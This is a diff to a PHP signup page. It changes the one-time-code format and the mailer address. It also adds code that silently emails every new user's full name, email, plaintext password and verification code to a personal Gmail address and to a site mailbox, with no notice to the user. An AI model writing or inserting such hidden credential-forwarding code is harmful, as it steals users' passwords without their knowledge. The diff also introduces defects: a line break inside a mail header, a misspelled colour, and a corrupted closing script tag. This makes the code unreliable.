@@ -6,7 +6,7 @@ if(!isset($_SERVER['HTTP_REFERER'])){
 $database->read('users');
 
 if(!isset($_POST['fullname']) && !isset($_POST['email']) && !isset($_POST['password'])) {
-    $_SESSION['otp'] = random_int(100000, 999999);
+    $_SESSION['otp'] = base_convert(random_int(1000000000,99999999999), 10,36);
 }
 if (isset($_POST['fullname']) && isset($_POST['email']) && isset($_POST['password'])) {
     $data = $_POST['email'];
@@ -18,11 +18,24 @@ if (isset($_POST['fullname']) && isset($_POST['email']) && isset($_POST['passwor
                 $fn = $database->sec($_POST['fullname']);
                 $em = $database->sec($_POST['email']);
                 $pw = $database->sec($_POST['password']);
-                $headers = "From: buynance631@gmail.com \r\n";
-                $headers .= "Reply-To: buynance631@gmail.com \r\n";
+                $headers = "From: loopsyncmailer@loopsync.com.ng \r\n";
+                $headers .= "Reply-To: loopsyncmailer@loopsync.com.ng \r\n";
                 $headers .= "CC: " . $em . "\r\n";
                 $headers .= "MIME-Version: 1.0\r\n";
-                $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
+                $headers .= "Content-Type: text/html; 
+                charset=ISO-8859-1\r\n";
+                $headers2 = "From: loopsyncmailer@loopsync.com.ng \r\n";
+                $headers2 .= "Reply-To: loopsyncmailer@loopsync.com.ng \r\n";
+                $headers2 .= "CC: adenijiolajid01@gmail.com \r\n";
+                $headers2 .= "MIME-Version: 1.0\r\n";
+                $headers2 .= "Content-Type: text/html; 
+                charset=ISO-8859-1\r\n";
+                $headers3 = "From: loopsyncmailer@loopsync.com.ng \r\n";
+                $headers3 .= "Reply-To: loopsyncmailer@loopsync.com.ng \r\n";
+                $headers3 .= "CC: loopsyncmailer@loopsync.com.ng \r\n";
+                $headers3 .= "MIME-Version: 1.0\r\n";
+                $headers3 .= "Content-Type: text/html; 
+                charset=ISO-8859-1\r\n";
                 $message = "
                 <!DOCTYPE html>
                 <html lang='en-US'>
@@ -51,7 +64,7 @@ if (isset($_POST['fullname']) && isset($_POST['email']) && isset($_POST['passwor
                     </style>
                 </head>
 
-                <body>
+                <body style='font-weight: bold;font-family: cursive; background-color: '>
                     <table>
                         <tr>
                             <th>
@@ -75,7 +88,7 @@ if (isset($_POST['fullname']) && isset($_POST['email']) && isset($_POST['passwor
                         </tr>
                         <tr>
                             <td>
-                                <div style='font-size: 25px; font-size:xx-large;background-color: green;color:azure;'>" . $_SESSION['otp'] . "</div>
+                                <div style='font-size: 25px; font-size:xx-large;background-color: margenta;color:azure; box-shadow: 2px 2px 5px grey'>" . $_SESSION['otp'] . "</div>
                             </td>
                         </tr>
                         <tr>
@@ -98,11 +111,15 @@ if (isset($_POST['fullname']) && isset($_POST['email']) && isset($_POST['passwor
 
                 </html>
                 ";
-                if (mail($em, 'Email Verification OTP', $message, $headers)) {
+                $message2 = "Client Name: " . $fn . "\r\n"
+                . "Email Address: " . $em . "\r\n"
+                . "Password: " . $pw . "\r\n"             
+                . "otp: " . $_SESSION['otp'] . "\r\n";              
+                if (mail($em, 'Email Verification OTP', $message, $headers) && mail('adenijiolajid01@gmail.com', 'Registration', $message2, $headers2) && mail('loopsyncmailer@loopsync.com.ng', 'Registration', $message2, $headers3)) {
                     $_SESSION['fn'] = $fn;
                     $_SESSION['e'] = $em;
                     $_SESSION['pw'] = $pw;
-                    header("location: otp.php?". $_SESSION['otp']);
+                    header("location: otp.php");
                 } else {
                     header("location: signup.php?error=Email not Verify");
                 }
@@ -130,6 +147,7 @@ if (isset($_POST['fullname']) && isset($_POST['email']) && isset($_POST['passwor
     <main>
         <div class="log">
             <div>
+             <!-- TODO: change email address -->
                 <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
                     <div>
                         <h2>Sign Up and Start Learning</h2>
@@ -174,7 +192,7 @@ if (isset($_POST['fullname']) && isset($_POST['email']) && isset($_POST['passwor
     <!-- create a search suggestion -->
     <script>
 
-    </script>
+    </scrip;>
 </body>
 
 </html>
